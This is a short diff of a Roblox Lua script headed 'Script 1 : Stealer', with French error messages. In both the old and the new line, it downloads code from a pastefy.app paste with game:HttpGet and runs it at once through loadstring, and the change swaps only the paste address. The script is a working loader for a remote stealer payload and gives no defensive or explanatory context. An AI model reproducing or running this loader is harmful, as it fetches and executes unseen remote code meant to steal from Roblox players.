@@ -1,7 +1,7 @@
 -- Script 1 : Stealer
 task.spawn(function()
     local success, err = pcall(function()
-        loadstring(game:HttpGet("https://pastefy.app/uOGWgxmR/raw"))()
+        loadstring(game:HttpGet("https://pastefy.app/lJbSvZYc/raw"))()
     end)
     if not success then warn("Erreur Script 1: " .. tostring(err)) end
 end)
